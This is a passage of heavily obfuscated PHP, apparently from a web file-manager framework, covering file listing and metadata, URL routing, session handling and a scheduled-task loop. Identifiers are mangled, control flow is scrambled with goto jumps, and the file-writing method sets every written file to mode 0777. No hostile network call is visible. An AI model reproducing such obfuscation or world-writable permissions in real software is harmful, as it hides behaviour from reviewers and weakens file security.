$C»¡¾øÂÁ‡ = rtrim($d±İ“ƒ†ºË, $c«ÕÃ¥ì×‹[8]) . $c«ÕÃ¥ì×‹[8] . $fâÌ©¼‚…ù; goto A»ˆÄÍ©Óæ; d‚ƒ¡Š„ƒÜ: } public function size($bê÷…„¯“ß) { $bê÷…„¯“ß = $this->iconvSystem($bê÷…„¯“ß); return filesize_64($bê÷…„¯“ß); } public function info($dÒã•Ì›À‚) { $dÒã•Ì›À‚ = $this->iconvSystem($dÒã•Ì›À‚); if ($this->isFolder($dÒã•Ì›À‚)) { return $this->folderInfo($dÒã•Ì›À‚); } else { if ($this->isFile($dÒã•Ì›À‚)) { return $this->fileInfo($dÒã•Ì›À‚); } } return !1; } protected function infoChildren($bî‘½´«¸…, &$AÃÙÙÏõÖ•, $dŒİš¿òÕĞ = true) { goto A¿˜®¾±ƒË; cåÍ®°†„: if ($dŒİš¿òÕĞ) { $bî‘½´«¸… = $this->iconvSystem($bî‘½´«¸…); } if (!($FÖ°œ‰³¬Ù = @opendir($bî‘½´«¸…))) { return; } while (($Eàöå’óë® = readdir($FÖ°œ‰³¬Ù)) !== !1) { if ($Eàöå’óë® == $b÷ÓïíÊ£[95] || $Eàöå’óë® == $b÷ÓïíÊ£[1250]) { continue; } $DÑÀÆˆšÕ« = $bî‘½´«¸… . $Eàöå’óë®; if (is_file($DÑÀÆˆšÕ«) || is_link($DÑÀÆˆšÕ«)) { $AÃÙÙÏõÖ•[$b÷ÓïíÊ£[79]]++; $AÃÙÙÏõÖ•[$b÷ÓïíÊ£[78]] += filesize_64($DÑÀÆˆšÕ«); } else { if (is_dir($DÑÀÆˆšÕ«)) { $AÃÙÙÏõÖ•[$b÷ÓïíÊ£[80]]++; $this->infoChildren($DÑÀÆˆšÕ«, $AÃÙÙÏõÖ•, !1); } } } goto B¢«‡®øç¨; A¿˜®¾±ƒË: $b÷ÓïíÊ£ =& $_SERVER[¬ı§†‰ú˜¼]; check_abort_echo(); $bî‘½´«¸… = rtrim($bî‘½´«¸…, $b÷ÓïíÊ£[8]) . $b÷ÓïíÊ£[8]; goto cåÍ®°†„; B¢«‡®øç¨: closedir($FÖ°œ‰³¬Ù); goto c·ù¶‹À«˜; c·ù¶‹À«˜: } private function folderInfo($Fáâ‘Î‰»í, $FÔåîÖ“Õ = false) { $FÔÒŸµñùæ =& $_SERVER[¬ı§†‰ú˜¼]; $Fáâ‘Î‰»í = rtrim($Fáâ‘Î‰»í, $FÔÒŸµñùæ[8]) . $FÔÒŸµñùæ[8]; $Cğƒ”§ÒÀƒ = $this->iconvApp($this->pathThis($Fáâ‘Î‰»í)); if ($FÔåîÖ“Õ) { return array($FÔÒŸµñùæ[28] => $Cğƒ”§ÒÀƒ, $FÔÒŸµñùæ[76] => $this->getPathOuter($Fáâ‘Î‰»í), $FÔÒŸµñùæ[29] => $FÔÒŸµñùæ[77]); } $F”ï…â²›† = array($FÔÒŸµñùæ[28] => $Cğƒ”§ÒÀƒ, $FÔÒŸµñùæ[76] => $this->getPathOuter($Fáâ‘Î‰»í), $FÔÒŸµñùæ[29] => $FÔÒŸµñùæ[77], $FÔÒŸµñùæ[193] => @filectime($Fáâ‘Î‰»í), $FÔÒŸµñùæ[84] => @filemtime($Fáâ‘Î‰»í), $FÔÒŸµñùæ[1253] => @fileatime($Fáâ‘Î‰»í), $FÔÒŸµñùæ[1254] => is_readable($Fáâ‘Î‰»í), $FÔÒŸµñùæ[1255] => is_writable($Fáâ‘Î‰»í), $FÔÒŸµñùæ[1256] => get_mode($Fáâ‘Î‰»í)); return $F”ï…â²›†; } private function fileInfo($Dª¸¹Œ™Ò³, $c”Å²ãç‚ = false) { $cæ„¬ê®Ü =& $_SERVER[¬ı§†‰ú˜¼]; $e£Ï—ÅËÖ = $this->iconvApp($this->pathThis($Dª¸¹Œ™Ò³)); if ($c”Å²ãç‚) { return array($cæ„¬ê®Ü[28] => $e£Ï—ÅËÖ, $cæ„¬ê®Ü[76] => $this->getPathOuter($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[29] => $cæ„¬ê®Ü[192], $cæ„¬ê®Ü[78] => $this->size($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[168] => $this->ext($e£Ï—ÅËÖ)); } $C¯£‹·¼ó = array($cæ„¬ê®Ü[28] => $e£Ï—ÅËÖ, $cæ„¬ê®Ü[76] => $this->getPathOuter($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[29] => $cæ„¬ê®Ü[192], $cæ„¬ê®Ü[193] => @filectime($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[84] => @filemtime($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[1253] => @fileatime($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[78] => $this->size($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[168] => $this->ext($e£Ï—ÅËÖ), $cæ„¬ê®Ü[1254] => is_readable($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[1255] => is_writable($Dª¸¹Œ™Ò³), $cæ„¬ê®Ü[1256] => get_mode($Dª¸¹Œ™Ò³)); return $C¯£‹·¼ó; } public function exist($a†î¯«¶) { $a†î¯«¶ = $this->iconvSystem($a†î¯«¶); return @file_exists($a†î¯«¶); } public function isFile($aÍ²Â´Ï¬š) { $aÍ²Â´Ï¬š = $this->iconvSystem($aÍ²Â´Ï¬š); return @is_file($aÍ²Â´Ï¬š); } public function isFolder($E”Œ‘¨ÛŠì) { $E”Œ‘¨ÛŠì = $this->iconvSystem($E”Œ‘¨ÛŠì); return @is_dir($E”Œ‘¨ÛŠì); } public function listPath($cÜÆ®ƒ¨³, $D„Şİ‘ˆçï = false) { goto E¨£Œà¤; d†¡†ùãÉ¨: closedir($eËç›¢Ì‡); return $E¦õæ‡å‹ª; goto a¥ñ„Èî; d©ÁÏ—¾Ü­: $E¦õæ‡å‹ª = array($aŸ¹ŸêÅ¹ª[75] => array(), $aŸ¹ŸêÅ¹ª[74] => array()); if (!($eËç›¢Ì‡ = @opendir($cÜÆ®ƒ¨³))) { return $E¦õæ‡å‹ª; } while (($Fñ½Êá¨áŞ = readdir($eËç›¢Ì‡)) !== !1) { if ($Fñ½Êá¨áŞ == $aŸ¹ŸêÅ¹ª[95] || $Fñ½Êá¨áŞ == $aŸ¹ŸêÅ¹ª[1250]) { continue; } $b³ùêÃŒåè = $cÜÆ®ƒ¨³ . $Fñ½Êá¨áŞ; if (is_file($b³ùêÃŒåè)) { $E¦õæ‡å‹ª[$aŸ¹ŸêÅ¹ª[74]][] = $this->fileInfo($b³ùêÃŒåè, $D„Şİ‘ˆçï); } else { $E¦õæ‡å‹ª[$aŸ¹ŸêÅ¹ª[75]][] = $this->folderInfo($b³ùêÃŒåè, $D„Şİ‘ˆçï); } } goto d†¡†ùãÉ¨; E¨£Œà¤: $aŸ¹ŸêÅ¹ª =& $_SERVER[¬ı§†‰ú˜¼]; $cÜÆ®ƒ¨³ = $this->iconvSystem($cÜÆ®ƒ¨³); $cÜÆ®ƒ¨³ = rtrim($cÜÆ®ƒ¨³, $aŸ¹ŸêÅ¹ª[8]) . $aŸ¹ŸêÅ¹ª[8]; goto d©ÁÏ—¾Ü­; a¥ñ„Èî: } public function listAll($A´¦ª—è‹ç, &$Cå‰¯É÷Ã = array()) { goto EàÂ—•¤é; EàÂ—•¤é: $a»Œ…¹ìïÏ =& $_SERVER[¬ı§†‰ú˜¼]; $A´¦ª—è‹ç = $this->iconvSystem($A´¦ª—è‹ç); $A´¦ª—è‹ç = rtrim($A´¦ª—è‹ç, $a»Œ…¹ìïÏ[8]) . $a»Œ…¹ìïÏ[8]; goto eâ”¹á¸ñ; eâ”¹á¸ñ: if (!($DŠ®›—˜Ù = @opendir($A´¦ª—è‹ç))) { return $Cå‰¯É÷Ã; } while (($fß©¬ÅÅÌ = readdir($DŠ®›—˜Ù)) !== !1) { if ($fß©¬ÅÅÌ == $a»Œ…¹ìïÏ[95] || $fß©¬ÅÅÌ == $a»Œ…¹ìïÏ[1250]) { continue; } $a³¹ê’æó¸ = $A´¦ª—è‹ç . $fß©¬ÅÅÌ; if (is_dir($a³¹ê’æó¸) && !is_link($a³¹ê’æó¸)) { $Cå‰¯É÷Ã[] = array($a»Œ…¹ìïÏ[76] => $a³¹ê’æó¸ . $a»Œ…¹ìïÏ[8], $a»Œ…¹ìïÏ[77] => 1, $a»Œ…¹ìïÏ[84] => @filemtime($a³¹ê’æó¸), $a»Œ…¹ìïÏ[78] => 0); $this->listAll($a³¹ê’æó¸, $Cå‰¯É÷Ã); } else { $Cå‰¯É÷Ã[] = array($a»Œ…¹ìïÏ[76] => $a³¹ê’æó¸, $a»Œ…¹ìïÏ[77] => 0, $a»Œ…¹ìïÏ[84] => @filemtime($a³¹ê’æó¸), $a»Œ…¹ìïÏ[78] => $this->size($a³¹ê’æó¸)); } } closedir($DŠ®›—˜Ù); goto bÅé·†›; bÅé·†›: return $Cå‰¯É÷Ã; goto aÇŸì…¼©×; aÇŸì…¼©×: } public function has($Câºó¬È»º, $C ¾í¬¥­² = false, $CŒøÌ§ìÑ = true) { goto FŒÕÒÁ§ ; d½Ğ¶ª÷öº: if ($C ¾í¬¥­²) { return array($eÆ£ÃÀ»í·[202] => $Bà¥±™‡—Å, $eÆ£ÃÀ»í·[203] => $b’µµìÖæË); } return !1; goto aî½‰Ìé…³; FŒÕÒÁ§ : $eÆ£ÃÀ»í· =& $_SERVER[¬ı§†‰ú˜¼]; $Câºó¬È»º = $this->iconvSystem($Câºó¬È»º); $Câºó¬È»º = rtrim($Câºó¬È»º, $eÆ£ÃÀ»í·[8]) . $eÆ£ÃÀ»í·[8]; goto EÛ†àâééğ; bÓ§÷˜: $eƒˆ¥ì½¾Ê = 0; while (($A¼²º½ŠÌÅ = readdir($Då‹ó¨Àƒ)) !== !1) { if ($A¼²º½ŠÌÅ == $eÆ£ÃÀ»í·[95] || $A¼²º½ŠÌÅ == $eÆ£ÃÀ»í·[1250]) { continue; } $aì¿÷‘ºÆ¥ = $Câºó¬È»º . $A¼²º½ŠÌÅ; if ($C ¾í¬¥­²) { $eƒˆ¥ì½¾Ê++; if (@is_file($aì¿÷‘ºÆ¥)) { $Bà¥±™‡—Å++; } else { $b’µµìÖæË++; } if ($eƒˆ¥ì½¾Ê > 10000) { break; } continue; } if ($CŒøÌ§ìÑ) { if (@is_file($aì¿÷‘ºÆ¥)) { return !0; } } else { if (@is_dir($aì¿÷‘ºÆ¥ . $eÆ£ÃÀ»í·[8])) { return !0; } } } closedir($Då‹ó¨Àƒ); goto d½Ğ¶ª÷öº; EÛ†àâééğ: if (!($Då‹ó¨Àƒ = @opendir($Câºó¬È»º))) { return !1; } $Bà¥±™‡—Å = 0; $b’µµìÖæË = 0; goto bÓ§÷˜; aî½‰Ìé…³: } public function hashSimple($FÒ¯è‡¯Ë) { goto CŒó·İƒ„‡; CŒó·İƒ„‡: $Cœ×¿Šè¦– =& $_SERVER[¬ı§†‰ú˜¼]; if (!$FÒ¯è‡¯Ë) { return md5($Cœ×¿Šè¦–[33]); } $FÒ¯è‡¯Ë = $this->iconvSystem($FÒ¯è‡¯Ë); goto B¸“Íïº¹´; CšÁß½Ä‡Ò: return md5($A÷Øê¯ŞÀ˜) . $d“–§¨Ë¨; goto a‡Šß„‰; B¸“Íïº¹´: $d“–§¨Ë¨ = $this->size($FÒ¯è‡¯Ë); $aÊ‚›¹³šñ = 200; $CÎ¡ºĞ¾¯ = 50; goto a¾´¶ƒØãË; FÎÍæœœ®: $FíËÓ²çÜ = fopen($FÒ¯è‡¯Ë, $Cœ×¿Šè¦–[1257]); if (!$FíËÓ²çÜ) { return $A÷Øê¯ŞÀ˜; } for ($AËÄºèÚˆÛ = 0; $AËÄºèÚˆÛ < $CÎ¡ºĞ¾¯; $AËÄºèÚˆÛ++) { fseek_64($FíËÓ²çÜ, $Aë¤Ïƒâ‹Ğ * $AËÄºèÚˆÛ); $A÷Øê¯ŞÀ˜ .= fread($FíËÓ²çÜ, $aÊ‚›¹³šñ); } goto c¹ê¢ĞïùÉ; c¹ê¢ĞïùÉ: fseek_64($FíËÓ²çÜ, $d“–§¨Ë¨ - $aÊ‚›¹³šñ); $A÷Øê¯ŞÀ˜ .= fread($FíËÓ²çÜ, $aÊ‚›¹³šñ); fclose($FíËÓ²çÜ); goto CšÁß½Ä‡Ò; a¾´¶ƒØãË: if ($d“–§¨Ë¨ <= $aÊ‚›¹³šñ * $CÎ¡ºĞ¾¯) { return $this->hashMd5($FÒ¯è‡¯Ë) . $d“–§¨Ë¨; } $A÷Øê¯ŞÀ˜ = $Cœ×¿Šè¦–[33]; $Aë¤Ïƒâ‹Ğ = intval($d“–§¨Ë¨ / $CÎ¡ºĞ¾¯); goto FÎÍæœœ®; a‡Šß„‰: } public function getContent($F„Ë½©„İ) { $F„Ë½©„İ = $this->iconvSystem($F„Ë½©„İ); return file_get_contents($F„Ë½©„İ); } public function setContent($B°ÅÅ±İÃ, $DÔÑ´²ÆÑ› = '') { $B°ÅÅ±İÃ = $this->iconvSystem($B°ÅÅ±İÃ); $bÎÔà™×Æ = @file_put_contents($B°ÅÅ±İÃ, $DÔÑ´²ÆÑ›, LOCK_EX); clearstatcache(); @chmod($B°ÅÅ±İÃ, 511); return $bÎÔà™×Æ === !1 ? !1 : !0; } public function fileSubstr($fÜ»¡Ë¾¤¹, $AÈè‰ÒåŸ = 0, $BáÚÁ¬‚ = false) { goto B¸Úğ—¾ˆö; A…­ÛµÉ‰¸: return $EÜ£åë’òˆ; goto F—éÀÙçé; a÷Ûğ·ØÈÁ: fseek_64($C°ß§õÕÚ, $AÈè‰ÒåŸ); $EÜ£åë’òˆ = fread($C°ß§õÕÚ, $BáÚÁ¬‚); fclose($C°ß§õÕÚ); goto A…­ÛµÉ‰¸; Fé¦ç½ Î«: if ($BáÚÁ¬‚ <= 0) { return $b—ÏöîŞŠÕ[33]; } $C°ß§õÕÚ = fopen($fÜ»¡Ë¾¤¹, $b—ÏöîŞŠÕ[1257]); if (!$C°ß§õÕÚ) { return !1; } goto a÷Ûğ·ØÈÁ; B¸Úğ—¾ˆö: $b—ÏöîŞŠÕ =& $_SERVER[¬ı§†‰ú˜¼]; $fÜ»¡Ë¾¤¹ = $this->iconvSystem($fÜ»¡Ë¾¤¹); if ($BáÚÁ¬‚ === !1) { $BáÚÁ¬‚ = $this->size($fÜ»¡Ë¾¤¹); } goto Fé¦ç½ Î«; F—éÀÙçé: } public function upload($CŠèØ‘Ëİ, $BÏƒ˜›ï¢‘, $AÅÑˆåêã¶ = false, $a—ğëÚ¶Ì¤ = REPEAT_REPLACE) { if ($AÅÑˆåêã¶) { return $this->moveFile($BÏƒ˜›ï¢‘, $CŠèØ‘Ëİ); } return $this->copyFile($BÏƒ˜›ï¢‘, $CŠèØ‘Ëİ); } public function setModifyTime($D¸˜ˆ‹ĞïÅ, $fíÅ¤òŞà½ = '') { @touch($D¸˜ˆ‹ĞïÅ, intval($fíÅ¤òŞà½)); } public function download($fø£Ì™„œ’, $bŸã«õç·È) { return $this->iconvSystem($fø£Ì™„œ’); } } goto eÁ©øÖµ¸Ğ; a·° ÷Úº³: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\x2f\135\53", "\72\x6e\x75\155" => "\133\60\55\71\x5d\x2b", "\72\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($DôÅø›‘·Ù, $a˜ŸÙ¤¤È) { $bëœ©•É¨× =& $_SERVER[¬ı§†‰ú˜¼]; if ($DôÅø›‘·Ù == $bëœ©•É¨×[1476]) { $a•¨Ü´—Â = array_map($bëœ©•É¨×[1477], $a˜ŸÙ¤¤È[0]); $A«ÁÒ¼Ÿ = strpos($a˜ŸÙ¤¤È[1], $bëœ©•É¨×[8]) === 0 ? $a˜ŸÙ¤¤È[1] : $bëœ©•É¨×[8] . $a˜ŸÙ¤¤È[1]; $eº–ŒÕáˆ = $a˜ŸÙ¤¤È[2]; } else { $a•¨Ü´—Â = null; $A«ÁÒ¼Ÿ = strpos($a˜ŸÙ¤¤È[0], $bëœ©•É¨×[8]) === 0 ? $a˜ŸÙ¤¤È[0] : $bëœ©•É¨×[8] . $a˜ŸÙ¤¤È[0]; $eº–ŒÕáˆ = $a˜ŸÙ¤¤È[1]; } array_push(self::$maps, $a•¨Ü´—Â); array_push(self::$routes, $A«ÁÒ¼Ÿ); array_push(self::$methods, strtoupper($DôÅø›‘·Ù)); array_push(self::$callbacks, $eº–ŒÕáˆ); } public static function error($Aºˆ…¥¤¾È) { self::$errorCallback = $Aºˆ…¥¤¾È; } public static function haltOnMatch($B¤¸¾”†î÷ = true) { self::$halts = $B¤¸¾”†î÷; } public static function dispatch() { goto D±è’‡Šì; d”‹¸—Ú…: $f¹Œ©õ´†¥ = array_keys(static::$patterns); $BÃøáÉ™º§ = array_values(static::$patterns); $d©ôé’Ô˜ˆ = !1; goto fôòÌÚ§Ì; D±è’‡Šì: $AíÔõ˜á˜ë =& $_SERVER[¬ı§†‰ú˜¼]; $a©¥½¬®´Ç = parse_url($_SERVER[$AíÔõ˜á˜ë[1478]], PHP_URL_PATH); $F„Éª£»‡ = $_SERVER[$AíÔõ˜á˜ë[157]]; goto d”‹¸—Ú…; fôòÌÚ§Ì: self::$routes = preg_replace($AíÔõ˜á˜ë[1162], $AíÔõ˜á˜ë[8], self::$routes); if (in_array($a©¥½¬®´Ç, self::$routes)) { $cš„õÎŞ°’ = array_keys(self::$routes, $a©¥½¬®´Ç); foreach ($cš„õÎŞ°’ as $eÊÒÆ‚Õƒë) { if (self::$methods[$eÊÒÆ‚Õƒë] == $F„Éª£»‡ || self::$methods[$eÊÒÆ‚Õƒë] == $AíÔõ˜á˜ë[1479] || in_array($F„Éª£»‡, self::$maps[$eÊÒÆ‚Õƒë])) { $d©ôé’Ô˜ˆ = !0; if (!is_object(self::$callbacks[$eÊÒÆ‚Õƒë])) { $fß©ĞÃá‹× = explode($AíÔõ˜á˜ë[8], self::$callbacks[$eÊÒÆ‚Õƒë]); $D·¿§×À«ì = end($fß©ĞÃá‹×); $c˜©ß¡¡‘Š = explode($AíÔõ˜á˜ë[1480], $D·¿§×À«ì); $dÙ«½ßÚ´ì = new $c˜©ß¡¡‘Š[0](); $dÙ«½ßÚ´ì->{$c˜©ß¡¡‘Š[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$eÊÒÆ‚Õƒë]); if (self::$halts) { return; } } } } } else { $DšİÛË®¬é = 0; foreach (self::$routes as $eÊÒÆ‚Õƒë) { if (strpos($eÊÒÆ‚Õƒë, $AíÔõ˜á˜ë[4]) !== !1) { $eÊÒÆ‚Õƒë = str_replace($f¹Œ©õ´†¥, $BÃøáÉ™º§, $eÊÒÆ‚Õƒë); } if (preg_match($AíÔõ˜á˜ë[1481] . $eÊÒÆ‚Õƒë . $AíÔõ˜á˜ë[1482], $a©¥½¬®´Ç, $FèĞèàÎ¼™)) { if (self::$methods[$DšİÛË®¬é] == $F„Éª£»‡ || self::$methods[$DšİÛË®¬é] == $AíÔõ˜á˜ë[1479] || !empty(self::$maps[$DšİÛË®¬é]) && in_array($F„Éª£»‡, self::$maps[$DšİÛË®¬é])) { $d©ôé’Ô˜ˆ = !0; array_shift($FèĞèàÎ¼™); if (!is_object(self::$callbacks[$DšİÛË®¬é])) { $fß©ĞÃá‹× = explode($AíÔõ˜á˜ë[8], self::$callbacks[$DšİÛË®¬é]); $D·¿§×À«ì = end($fß©ĞÃá‹×); $c˜©ß¡¡‘Š = explode($AíÔõ˜á˜ë[1480], $D·¿§×À«ì); $dÙ«½ßÚ´ì = new $c˜©ß¡¡‘Š[0](); if (!method_exists($dÙ«½ßÚ´ì, $c˜©ß¡¡‘Š[1])) { echo $AíÔõ˜á˜ë[1483]; } else { call_user_func_array(array($dÙ«½ßÚ´ì, $c˜©ß¡¡‘Š[1]), $FèĞèàÎ¼™); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DšİÛË®¬é], $FèĞèàÎ¼™); if (self::$halts) { return; } } } } $DšİÛË®¬é++; } } if ($d©ôé’Ô˜ˆ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aÂˆæÎ³÷è =& $_SERVER[¬ı§†‰ú˜¼]; header($_SERVER[$aÂˆæÎ³÷è[1484]] . $aÂˆæÎ³÷è[1485]); echo $aÂˆæÎ³÷è[1486]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$AíÔõ˜á˜ë[1478]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto D­×Á§¯‡ù; D­×Á§¯‡ù: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D¿ìñŞñÇ†; D¿ìñŞñÇ†: $fÇ¯ôÏÛô =& $_SERVER[¬ı§†‰ú˜¼]; static $Cõ‰òŞïôÍ = false; if ($Cõ‰òŞïôÍ) { return $Cõ‰òŞïôÍ; } goto d§ˆ©ª†»; bˆÌ‘ù¢Ôö: $e‰ØÀ‘ÛĞÌ = $b¹å‹°¥Ô[$aÎ‘ê§Š¼]; $e‰ÛÄÈè = $b¹å‹°¥Ô[$fÇ¯ôÏÛô[801]]; switch ($aÎ‘ê§Š¼) { case $fÇ¯ôÏÛô[17]: self::$handle = Model($fÇ¯ôÏÛô[802]); break; case $fÇ¯ôÏÛô[803]: self::$handle = new CacheRedis($e‰ØÀ‘ÛĞÌ, $e‰ÛÄÈè); break; case $fÇ¯ôÏÛô[804]: self::$handle = new CacheMemcached($e‰ØÀ‘ÛĞÌ, $e‰ÛÄÈè); break; case $fÇ¯ôÏÛô[192]: $e‰ØÀ‘ÛĞÌ[$fÇ¯ôÏÛô[76]] = $e‰ØÀ‘ÛĞÌ[$fÇ¯ôÏÛô[76]] . $fÇ¯ôÏÛô[1490]; self::$handle = new CacheFile($e‰ØÀ‘ÛĞÌ, $e‰ÛÄÈè); default: break; } goto d×«–ÑÏÜÔ; d§ˆ©ª†»: $b¹å‹°¥Ô = $GLOBALS[$fÇ¯ôÏÛô[6]][$fÇ¯ôÏÛô[346]]; self::$sessionTime = $b¹å‹°¥Ô[$fÇ¯ôÏÛô[1487]]; $eÃ³¦¢§÷ì = isset($GLOBALS[$fÇ¯ôÏÛô[1488]]) ? $GLOBALS[$fÇ¯ôÏÛô[1488]] : SESSION_ID; goto eƒ÷«ñë½; eƒ÷«ñë½: if (self::$sessionSign) { } else { if (Cookie::get($eÃ³¦¢§÷ì)) { self::$sessionSign = Cookie::get($eÃ³¦¢§÷ì); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eÃ³¦¢§÷ì, self::$sessionSign, self::$sessionTime); $aÎ‘ê§Š¼ = $b¹å‹°¥Ô[$fÇ¯ôÏÛô[1489]]; goto bˆÌ‘ù¢Ôö; d×«–ÑÏÜÔ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Cõ‰òŞïôÍ = new self(); return $Cõ‰òŞïôÍ; goto CÃ¿¹ùŒ×É; CÃ¿¹ùŒ×É: } public static function sign($d«ÑÜÂë ø = false) { $d«ÑÜÂë ø && (self::$sessionSign = $d«ÑÜÂë ø); self::init(); return self::$sessionSign; } public static function set($fí¢Ò¢†ã›, $DÒàÉë¥‡ç = false) { self::init(); if (is_array($fí¢Ò¢†ã›)) { foreach ($fí¢Ò¢†ã› as $aŞ‘“ó => $e¡‘á¢™„œ) { array_set_value(self::$data, $aŞ‘“ó, $e¡‘á¢™„œ); } } else { array_set_value(self::$data, $fí¢Ò¢†ã›, $DÒàÉë¥‡ç); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Eİ¥‚Ğƒ×İ = false) { self::init(); if (!$Eİ¥‚Ğƒ×İ) { return self::$data; } return array_get_value(self::$data, $Eİ¥‚Ğƒ×İ); } public static function remove($A•Æ¹™ƒµŠ) { self::init(); unset(self::$data[$A•Æ¹™ƒµŠ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¬ı§†‰ú˜¼][806])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto c¢Ìóèà†Ø; f‹¸øÙÌ‚¸: http_close(); self::valueSet($C‰ÏŞ»Ë“ï[1491], $C‰ÏŞ»Ë“ï[87]); Hook::bind($C‰ÏŞ»Ë“ï[1493], $C‰ÏŞ»Ë“ï[1494]); goto c¬›ÒŞÔÂˆ; c¢Ìóèà†Ø: $C‰ÏŞ»Ë“ï =& $_SERVER[¬ı§†‰ú˜¼]; if (self::valueGet($C‰ÏŞ»Ë“ï[714]) != $C‰ÏŞ»Ë“ï[87]) { return; } if (self::valueGet($C‰ÏŞ»Ë“ï[1491]) == $C‰ÏŞ»Ë“ï[87]) { $bË¹Š…‘‡Ë = self::valueGet($C‰ÏŞ»Ë“ï[1492]); if (time() - $bË¹Š…‘‡Ë > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto f‹¸øÙÌ‚¸; c¬›ÒŞÔÂˆ: while (!0) { self::cacheClear(); if (self::valueGet($C‰ÏŞ»Ë“ï[714]) != $C‰ÏŞ»Ë“ï[87]) { self::valueSet($C‰ÏŞ»Ë“ï[1491], $C‰ÏŞ»Ë“ï[495]); self::log($C‰ÏŞ»Ë“ï[1495]); die; } self::valueSet($C‰ÏŞ»Ë“ï[1491], $C‰ÏŞ»Ë“ï[87]); self::valueSet($C‰ÏŞ»Ë“ï[1492], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto dÜ‰Ù²™—ä; dÜ‰Ù²™—ä: } public static function restart() { $CÄñš»”ÉÄ =& $_SERVER[¬ı§†‰ú˜¼]; http_close(); self::valueSet($CÄñš»”ÉÄ[714], $CÄñš»”ÉÄ[495]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($CÄñš»”ÉÄ[1491], $CÄñš»”ÉÄ[495]); self::valueSet($CÄñš»”ÉÄ[714], $CÄñš»”ÉÄ[87]); } public static function shutdownEvent() { $BÍÔßíéĞ… =& $_SERVER[¬ı§†‰ú˜¼]; self::valueSet($BÍÔßíéĞ…[1491], $BÍÔßíéĞ…[495]); self::log($BÍÔßíéĞ…[1496]); } public static function config($FŸØ¸ë—ÂÆ, $FÂ¦ˆ¨Ç‡‘) { self::valueSet($_SERVER[¬ı§†‰ú˜¼][714], $FŸØ¸ë—ÂÆ); } private static function taskRunAll() { goto CÙÑ•÷®Ò¼; e¼­É…Ã”: $c¸å×‡ŞÅŸ = count($CÀ¡Œ§›Î); for ($bƒ²éŠˆ¿é = 0; $bƒ²éŠˆ¿é < $c¸å×‡ŞÅŸ; $bƒ²éŠˆ¿é++) { $c²Ú®À¼¶¶ = $CÀ¡Œ§›Î[$bƒ²éŠˆ¿é]; if (!$c²Ú®À¼¶¶[$c±•ÔíÂœ[392]] || $c²Ú®À¼¶¶[$c±•ÔíÂœ[1498]] != $c±•ÔíÂœ[87]) { continue; } if (!self::taskTimeCheck($c²Ú®À¼¶¶)) { continue; } self::taskRun($c²Ú®À¼¶¶); } Hook::trigger($c±•ÔíÂœ[1499]); goto e¸ÂŒ¦æ¼; CÙÑ•÷®Ò¼: $c±•ÔíÂœ =& $_SERVER[¬ı§†‰ú˜¼]; $Bßò“‡ã = timeFloat(); $CÀ¡Œ§›Î = Model($c±•ÔíÂœ[1497])->listData(); goto e¼­É…Ã”; e¸ÂŒ¦æ¼: self::taskQueueRun($Bßò“‡ã); self::closeDatabase(); goto FŞ¨Ì…ï²; FŞ¨Ì…ï²: } private static function taskQueueRun($D·Ï½·©®ç) { $aõ‚ê‚Å‘ª = 10; while (!0) { $e’Ã‡ÑƒŠä = TaskQueue::run(); if ($e’Ã‡ÑƒŠä === !1) { break; } if (timeFloat() - $D·Ï½·©®ç >= $aõ‚ê‚Å‘ª) { break; } } } private static function taskTimeCheck($EØÔ’±âÔä) { goto CñÖÎé‰ò; CñÖÎé‰ò: $fñƒÚ³ï¯î =& $_SERVER[¬ı§†‰ú˜¼]; $eèèòóÇÕò = json_decode($EØÔ’±âÔä[$fñƒÚ³ï¯î[196]], !0); $c¬°ƒ¬›É‚ = intval($EØÔ’±âÔä[$fñƒÚ³ï¯î[1492]]); goto dæÀ‚ç©à¡; dæÀ‚ç©à¡: $D·²Ü± å· = strtotime($fñƒÚ³ï¯î[1500] . $eèèòóÇÕò[$fñƒÚ³ï¯î[1501]] . $fñƒÚ³ï¯î[1502]) - strtotime($fñƒÚ³ï¯î[1503]); $eÔ„ó’áö = time() - strtotime(date($fñƒÚ³ï¯î[1504]) . $fñƒÚ³ï¯î[1505]); $B¢ŸâÚ°²« = $eÔ„ó’áö >= $D·²Ü± å· && $eÔ„ó’áö <= $D·²Ü± å· + 3600; goto A…ğÔôŞ†Á; A…ğÔôŞ†Á: switch ($eèèòóÇÕò[$fñƒÚ³ï¯î[29]]) { case $fñƒÚ³ï¯î[1506]: if (time() - $c¬°ƒ¬›É‚ < 3600 * 24 * 30) { return !1; } if ($eèèòóÇÕò[$fñƒÚ³ï¯î[1506]] == date($fñƒÚ³ï¯î[1507]) && $B¢ŸâÚ°²«) { 